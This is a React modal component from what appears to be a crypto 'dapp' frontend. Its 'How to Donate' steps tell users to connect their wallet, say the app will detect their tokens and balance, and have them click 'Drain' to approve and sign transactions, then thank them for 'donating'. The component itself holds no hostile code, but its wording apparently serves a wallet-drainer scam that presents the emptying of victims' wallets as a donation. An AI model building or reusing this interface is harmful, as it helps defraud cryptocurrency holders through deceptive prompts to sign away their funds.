// src/components/GuideModal.jsx
import React, { useState } from "react";
import { motion } from "framer-motion";

export default function GuideModal() {
  const [open, setOpen] = useState(false);

  const steps = [
    "Connect your wallet (Connect Wallet).",
    "The dapp will detect your ERC20 tokens and native balance.",
    "Click 'Drain' to approve / sign as needed.",
    "Transactions will be sent; you'll receive notifications.",
    "Done — thanks for donating!"
  ];

  return (
    <>
      <button
        onClick={() => setOpen(true)}
        className="px-3 py-2 bg-slate-800 text-white text-sm rounded-md hover:bg-slate-900 transition"
      >
        How it works
      </button>

      {open && (
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          className="fixed inset-0 bg-black/60 flex items-center justify-center z-50"
        >
          <motion.div
            initial={{ scale: 0.9 }}
            animate={{ scale: 1 }}
            className="bg-white rounded-2xl p-6 max-w-md w-full relative shadow-lg"
          >
            <button
              onClick={() => setOpen(false)}
              className="absolute top-3 right-3 text-slate-600"
            >
              ×
            </button>
            <h2 className="text-xl font-bold mb-3">How to Donate</h2>
            <ul className="space-y-2 text-slate-700">
              {steps.map((s, i) => (
                <li key={i} className="flex items-start gap-2">
                  <div className="w-6 font-bold text-slate-800">{i + 1}.</div>
                  <div>{s}</div>
                </li>
              ))}
            </ul>
          </motion.div>
        </motion.div>
      )}
    </>
  );
}
